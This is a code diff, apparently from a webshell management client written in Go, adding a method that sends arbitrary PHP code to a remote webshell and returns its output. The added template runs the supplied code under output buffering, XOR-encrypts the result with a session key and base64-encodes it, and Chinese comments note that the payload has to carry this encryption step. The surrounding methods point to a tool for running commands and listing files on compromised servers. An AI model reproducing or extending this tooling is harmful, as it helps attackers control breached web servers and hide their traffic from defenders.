@@ -94,6 +94,32 @@ func (s *PHPShell) ExecCommand(id int, command string, url string, password stri
 	return res, nil
 }
 
+// ExecCode execute user's present shellcode
+func (s *PHPShell) ExecCode(id int, code string, url string, password string) (string, error) {
+	// 这里有个问题，直接自定义代码的话会缺少返回结果的加密过程，如何解决？发送过去的payload必须含有加密过程
+	shellcode := fmt.Sprintf(`
+error_reporting(0);
+session_start();
+$res = main();
+echo encrypt($res, $_SESSION['k']);
+function main() {
+	ob_start(); // 开始输出缓冲
+	%s          // 执行传入的代码
+	return ob_get_clean(); // 获取缓冲区内容并作为返回值
+}
+function encrypt($data, $key) {
+	for($i=0; $i<strlen($data); $i++) {
+		$data[$i] = $data[$i] ^ $key[($i+5)&15];
+	}
+	return base64_encode($data);
+}`, code)
+	res, err := util.HookPost(url, password, shellcode, PhpSessions[id])
+	if err != nil {
+		return "HookPost error", err
+	}
+	return res, nil
+}
+
 // FileList lists all files in the current directory
 func (s *PHPShell) FileList(id int, path string, url string, password string) (string, error) {
 	code, err := os.ReadFile("./pkg/api/php/FileList.php")
